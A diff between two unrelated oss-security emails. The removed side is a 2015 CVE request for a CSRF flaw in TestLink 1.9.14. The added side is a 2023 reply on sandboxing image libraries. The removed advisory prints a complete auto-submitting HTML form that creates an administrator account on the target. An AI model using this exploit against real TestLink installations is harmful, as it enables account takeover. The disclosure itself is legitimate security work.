@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2772" "Sunday" "8" "November" "2015" "20:01:42" "+0530" "Aravind" "altoarun@gmail.com" "<CALySL4Sh96-M5rgow-9xQ=HUH1JeAsiDi6pcHCT6X2F87b1Fdg@mail.gmail.com>" "94" "[oss-security] CVE Request: TestLink 1.9.14 CSRF Vulnerability" nil nil nil "11" "2015110814:31:42" "[oss-security] CVE Request: TestLink 1.9.14 CSRF Vulnerability" (number mark "U       altoarun@gma Nov  8   94/2772  " thread-indent "\"[oss-security] CVE Request: TestLink 1.9.14 CSRF Vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 10068 invoked by uid 550); 8 Nov 2015 15:25:41 -0000
+Received: (qmail 15374 invoked by uid 550); 22 Oct 2023 08:31:39 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,118 +7,139 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 26238 invoked from network); 8 Nov 2015 14:32:13 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20120113;
-        h=mime-version:from:date:message-id:subject:to:content-type;
-        bh=gSimEoyKAmVfHSdFJQRxJWQ/SrFVasv5GjCOSacE20s=;
-        b=PcmxZCZQfqLvMW2LzOuPKu1clltUYwBoYlou1CpA7AN7CM58iZ9rY3A1i/EDogB8V6
-         uNGwWW77EUp4mFhZ7zKYjzxcsLhIQSMrGAG9AFYlN44PwIjNsLkgUhQG76UQ/R877/Bs
-         QzDbfuW/R7j7dkWHoxAFyDaqg/zQe0baRpFE3lQE1XRGDhwFwg0vHHdEdFBwh0lzOC7x
-         owMkrIkYg+0ppI8bpjXrrSzWHPYKpTu4wK/AX3J+L/p9On5ekpYUg0XoMZg9zK1DdEXf
-         Xvrkvhf5MR3AxOyh8YliRbAyPb8DKzehzN4D/KoMY5UyvI28mje880qpttlmjDcSlqwl
-         iQ8g==
-X-Received: by 10.28.217.18 with SMTP id q18mr21078958wmg.10.1446993121924;
- Sun, 08 Nov 2015 06:32:01 -0800 (PST)
-MIME-Version: 1.0
-From: Aravind <altoarun@gmail.com>
-Date: Sun, 8 Nov 2015 20:01:42 +0530
-Message-ID: <CALySL4Sh96-M5rgow-9xQ=HUH1JeAsiDi6pcHCT6X2F87b1Fdg@mail.gmail.com>
+Received: (qmail 16383 invoked from network); 22 Oct 2023 00:46:13 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
+	invisiblethingslab.com; h=cc:content-type:content-type:date:date
+	:from:from:in-reply-to:in-reply-to:message-id:mime-version
+	:references:reply-to:sender:subject:subject:to:to; s=fm3; t=
+	1697935558; x=1698021958; bh=fCQhDK+j81x8cAS4/m7gdAo7ZjZzm7LWwhe
+	pxAr9/ak=; b=yD+7Jdi2vIkuZUv4lvX4ecXEAObX8I6uVXCexpHuipFNy/bHMEu
+	vqKwIvpmNyS/xj/3XZfetAoCD1P6QWot2opZ0hI3FubcmFBp8H1S3lpa/Ys/YJOj
+	94XvuqYKuM3HXFpDlTXhD/OcuSjHOXqf40B2IyBpTsgZimQQh0kR5dBTZGZyDudt
+	gOdfFkNgNkKZjBK0rntBOnWW+9iOdAa3IAu8efYRDj4fbu8FB+M1Oxtit9j5G0Rb
+	THoMGODEDDIuTl+TzWBUX/2/GV/alRMlviFwtrnc92l1+17Sp5IKNn4W25l1t6D2
+	EvvTGRb6TEHKgRXbw6SfNLwCWqmx1/88u8w==
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
+	messagingengine.com; h=cc:content-type:content-type:date:date
+	:feedback-id:feedback-id:from:from:in-reply-to:in-reply-to
+	:message-id:mime-version:references:reply-to:sender:subject
+	:subject:to:to:x-me-proxy:x-me-proxy:x-me-sender:x-me-sender
+	:x-sasl-enc; s=fm3; t=1697935558; x=1698021958; bh=fCQhDK+j81x8c
+	AS4/m7gdAo7ZjZzm7LWwhepxAr9/ak=; b=jsIXY+aGYgKzhj3exQsYHopmcrTJg
+	X6W8mQW3PrjhvZzV12kJtXuMukVyVMBoDkZ4SG/BoS3IVsUb5fR1NHG/hFE8tNp3
+	wCHNRQ0O6aLG8UtGkv/ehvrcobIgHFNrm8m41Em9M6uN4OrkpJifPqPOUW4X76VK
+	FHTZg0e4NjaC4BQybUnpQQFcvo0awpbnZZ5U1amixpY4O8W4yLRblSuv3zcBUHOr
+	jve3nNvuCSPR5RsP0Po2MqoFKt9KgSp8twtoooNfeIw8VmJwMLdC056TkQyFQu0F
+	qmXN1qZ+81lXTAt+RRrM4uATScVe0UxXBlfWMBDiVFh/33u/x50C05ABA==
+X-ME-Sender: <xms:xnA0ZRrdfXFXwn2R8Js8AsyVGMOnMC-BLK9ZFlL3X9UNCvB0ucE7WQ>
+    <xme:xnA0ZTqcKg9ar2-NEocRhpcRmfptf9QQMZxdUg6A66jQg08a8o_-M2_wDUXl2ZfSE
+    iyynHZ1v9BMslY>
+X-ME-Received: <xmr:xnA0ZeP4WAbs3TO_jS0PXiRw_HgmXgntANTMXS5bslD2mG78AMTt0RE2HweFHqB5xrjDaHhxd_Abs8ZHt9tbRMjgwVN_gXEi42_NQHheBpH-IgoS>
+X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgedvkedrkedugdefkecutefuodetggdotefrodftvf
+    curfhrohhfihhlvgemucfhrghsthforghilhdpqfgfvfdpuffrtefokffrpgfnqfghnecu
+    uegrihhlohhuthemuceftddtnecunecujfgurhepfffhvffukfhfgggtuggjsehgtderre
+    dttdejnecuhfhrohhmpeffvghmihcuofgrrhhivgcuqfgsvghnohhurhcuoeguvghmihes
+    ihhnvhhishhisghlvghthhhinhhgshhlrggsrdgtohhmqeenucggtffrrghtthgvrhhnpe
+    dttedtueeivdefiedugfejtdeutdelfedvueekledtudegjedviedukeefhfeuteenucev
+    lhhushhtvghrufhiiigvpedtnecurfgrrhgrmhepmhgrihhlfhhrohhmpeguvghmihesih
+    hnvhhishhisghlvghthhhinhhgshhlrggsrdgtohhm
+X-ME-Proxy: <xmx:xnA0Zc5WpTMJjEFJ8bhDgu3iSScaNPdc0dwjzwspTu4BgHCx2nQHZQ>
+    <xmx:xnA0ZQ7Ojm9iNzS5dyco_V-XvBYS4OONhQKQAjCOejIpJ4Ma86aPCw>
+    <xmx:xnA0ZUjsvGaDGiERz2dDEwY8ZjlYtWrlPJL1N66a_R5XZVXGe2-ZPg>
+    <xmx:xnA0ZSERn3TJQu1G_tkL46aPQLgo6gZXJ2koSW6A7xWy0rXizw7EVg>
+Feedback-ID: iac594737:Fastmail
+Date: Sat, 21 Oct 2023 20:45:40 -0400
+From: Demi Marie Obenour <demi@invisiblethingslab.com>
 To: oss-security@lists.openwall.com
-Content-Type: text/plain; charset=UTF-8
-Subject: [oss-security] CVE Request: TestLink 1.9.14 CSRF Vulnerability
+Message-ID: <ZTRwxHaoUqTPyf+b@itl-email>
+References: <56c8798b-0ad7-652b-d034-90229b6768f7@gmail.com>
+ <20231022000649.GA14340@openwall.com>
+MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha512;
+	protocol="application/pgp-signature"; boundary="AoSo05VpGDNYXz+Q"
+Content-Disposition: inline
+In-Reply-To: <20231022000649.GA14340@openwall.com>
+Subject: Re: [oss-security] sandboxing,of upstream programs by distros
 
-Can a CVE be assigned to the following ?
+--AoSo05VpGDNYXz+Q
+Content-Type: text/plain; protected-headers=v1; charset=utf-8
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
+Date: Sat, 21 Oct 2023 20:45:40 -0400
+From: Demi Marie Obenour <demi@invisiblethingslab.com>
+To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] sandboxing,of upstream programs by distros
 
-Information
-=================================
-Name: CSRF Vulnerability in TestLink 1.9.14
-Affected Software: TestLink
-Affected Versions: 1.9.14 and possibly below
-Vendor Homepage: http://testlink.org/
-Severity: High
-Status: Fixed
+On Sun, Oct 22, 2023 at 02:06:49AM +0200, Solar Designer wrote:
+> Hi Matt,
+>=20
+> I'm sorry I didn't follow up on this sooner.
+>=20
+> On Sat, Oct 14, 2023 at 06:39:49PM +1100, Matthew Fernandez wrote:
+> > Is there interest/solutions within the Rock Security SIG or other=20
+> > distro's security teams for sandboxing that package upstreams can opt=20
+> > into?
+>=20
+> For Rocky Linux Security SIG, the only relevant thing mentioned so far
+> was possibly offering an OpenBSD pledge()-alike that other packages
+> could use.  However, I am skeptical any actually would, unless we also
+> introduce such uses ourselves and maintain own "override" packages
+> (replacing RHEL rebuild ones or those coming from EPEL, etc.) of such
+> software.  Initially, we are going to only create "override' packages
+> for core or very commonly used/exposed components, and to do so only for
+> specific good reasons.  So stuff like e.g. ImageMagick/GraphicsMagick
+> coming from EPEL and with most of its dependency libraries coming from
+> AppStream repos, or e.g. GraphViz coming from AppStream, is unlikely to
+> make the cut, at least not initially.
 
+Has deprecating ImageMagick and/or GraphicsMagick outright been
+considered?  I don=E2=80=99t just mean the downstream packages, but the ent=
+ire
+upstream projects, or at least the libraries.
 
-Vulnerability Type:
-=================================
-Cross Site Request Forgery (CSRF)
+> Also, continuing these examples, it's probably more realistic to sandbox
+> their command-line tools, whereas the underlying libraries are probably
+> more exposed via language bindings.  Would we be introducing creation of
+> child processes into the libraries?  That's tricky as it could violate
+> expectations of programs using such libraries.  (Yet at Openwall we did
+> a similar thing in pam_tcb, albeit limiting this maybe-unexpected
+> behavior to setups that opted-in to it with the "fork" option in the PAM
+> configuration file.  So it's not completely out of consideration.)
 
+One option would be to instead make an IPC call to a persistent daemon
+running in the background.  That said, has wasm2c been considered?  The
+best fix would be something that can make C code memory-safe, even if it
+comes at a performance hit of 4x or more (like SoftBound+CETS did).
+Stuff that cares about performance should be migrating to something like
+libvips or ImageFlow.
 
-CVE Reference:
-=================================
-Not assigned
+If neither of these are options, I think the entire library will need to
+be deprecated for eventual removal.  The command-line tools can remain,
+but they can be much more strongly sandboxed than a library can, because
+they have the entire process to themselves.
+--=20
+Sincerely,
+Demi Marie Obenour (she/her/hers)
+Invisible Things Lab
 
+--AoSo05VpGDNYXz+Q
+Content-Type: application/pgp-signature; name="signature.asc"
 
-Technical Details:
-=================================
-Even though the use of CSRF tokens are being implemented in the
-application, they aren't properly
-validated at the server side. This allows malicious requests to be
-generated by the attacker and
-get them processed by the server on behalf of the victim. By
-exploiting the vulnerability,
-the attacker will be able to create user accounts with administrator
-privileges on the application.
+-----BEGIN PGP SIGNATURE-----
 
+iQIzBAEBCgAdFiEEdodNnxM2uiJZBxxxsoi1X/+cIsEFAmU0cMQACgkQsoi1X/+c
+IsEA2g/6AmJ0XYdSK4Klg+rRjptMjbWVVxsBeAnGO9qixRjzZAdQAiCteIPn9e6Q
+cE1mz9v/+3SIzTzDZL7Pge9Z3G5RcgG7Sp1yuloSHeMDyRXKG5zdk0z5aq/Uf9rS
+dX8eXwtlKiz91tB+075gsR2c7ePUnlrx0UzLZ42pT+y+MYnt9gMX9+cAevDWSoCq
+VfSZK7sx+mkSRs29/u2w+L5yV3MYjPGUh0rEi267MqsQFcCwn5k3vicI2xqW0cwD
+i8Bht/ZAiu9yBXIsozfqkXDhQkntK91/otWGshVoC699HKA0EjkIC0GJT9zlM7WM
+ZQckx5GhqJ5WUQ8RD1z9r6u0FfaEBWqtfxgh51Tq1FhV7BAvQHNwGcEUefMdDQsE
+CGh+I0rHIG42G9FLQD2anMo+BzOAsbY+b1q1Sorrvb5Bs1we1WN2nCSAUZK96quB
+ei4lglwTGFVPAcMOuf991+o7NnUzicJTyRoaaRtUpZvjX3ubV9HPMZD2cOQM8NA9
+Vk26ED70DPLRynde46Qt4T0mFM7pNkrV+hnI9O1vJK3w2iAxNwmdKtrGg7+oTeLe
+8bp2MQmGQEbwtyh+2XJxckbwU0nz3NE38ups2VNCXdVHzQRgtF30+iPLdkXZF2zA
+ohVo870/ltB2yPaPWsmyWO+1o6oK+h+FpYMF7SWQojuoMAdK+fk=
+=mwDz
+-----END PGP SIGNATURE-----
 
-Exploit Code
-=================================
-
-<html lang="en">
-<head>
-<title>CSRF Exploit to Create New Administrator Account</title>
-</head>
-<body>
-<form action="http://localhost/testlink_1_9_14/lib/usermanagement/usersEdit.php"
-id="formid" method="post">
-<input type="hidden" name="CSRFName" value="" />
-<input type="hidden" name="CSRFToken" value="" />
-<input type="hidden" name="user_id" value="" />
-<input type="hidden" name="user_login" value="" />
-<input type="hidden" name="login" value="new_admin" />
-<input type="hidden" name="firstName" value="new_administrator_fname" />
-<input type="hidden" name="lastName" value="new_administrator_lname" />
-<input type="hidden" name="password" value="new_administrator_password" />
-<input type="hidden" name="emailAddress" value="new_administrator@admin.com" />
-<input type="hidden" name="rights_id" value="8" />
-<input type="hidden" name="locale" value="en_GB" />
-<input type="hidden" name="authentication" value="" />
-<input type="hidden" name="user_is_active" value="on" />
-<input type="hidden" name="doAction" value="doCreate" />
-<input type="hidden" name="do_update" value="Save" />
-</form>
-<script>
-document.getElementById('formid').submit();
-</script>
-</body>
-</html>
-
-
-Exploitation Technique:
-===================================
-Remote
-
-
-Severity Level:
-===================================
-High
-
-
-Advisory Timeline
-===================================
-Sat, 7 Nov 2015 13:14:33 +0530 - First Contact
-Sat, 7 Nov 2015 08:52:14 +0100 - Vendor Response
-Sat, 7 Nov 2015 13:00:54 +0100 - Vendor Fixed
-Sun, 8 Nov 2015 19:03:00 +0530 - Public Disclosure
-
-
-Solution
-====================================
-This vulnerability is fixed in TestLink 1.9.15 (Tauriel)
-Fix: https://github.com/TestLinkOpenSourceTRMS/testlink-code/commit/1cb1f78f1a50f6e6819bcbadeae345eb3213c487
-
-
-Credits & Authors
-====================================
-Aravind C Ajayan, Balagopal N
+--AoSo05VpGDNYXz+Q--
